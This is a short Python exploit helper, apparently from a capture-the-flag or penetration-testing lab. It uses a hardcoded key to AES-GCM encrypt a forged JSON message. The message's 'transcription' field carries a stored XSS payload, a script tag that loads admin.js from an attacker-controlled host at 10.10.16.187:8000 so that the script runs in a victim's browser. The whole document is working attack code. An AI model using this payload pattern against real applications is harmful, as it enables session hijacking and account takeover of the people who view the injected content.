#!/usr/bin/env python3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib, os, base64, json

KEY = b"bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"
key = hashlib.sha256(KEY).digest()

def encrypt(payload_dict):
    aesgcm = AESGCM(key)
    iv = os.urandom(12)
    data = json.dumps(payload_dict, separators=(',', ':')).encode()
    ciphertext = aesgcm.encrypt(iv, data, None)
    combined = iv + ciphertext
    return base64.b64encode(combined).decode()

payload = {
    "transcription": "<script src='http://10.10.16.187:8000/admin.js'></script>",
    "summary": "test"
}

print(encrypt(payload))
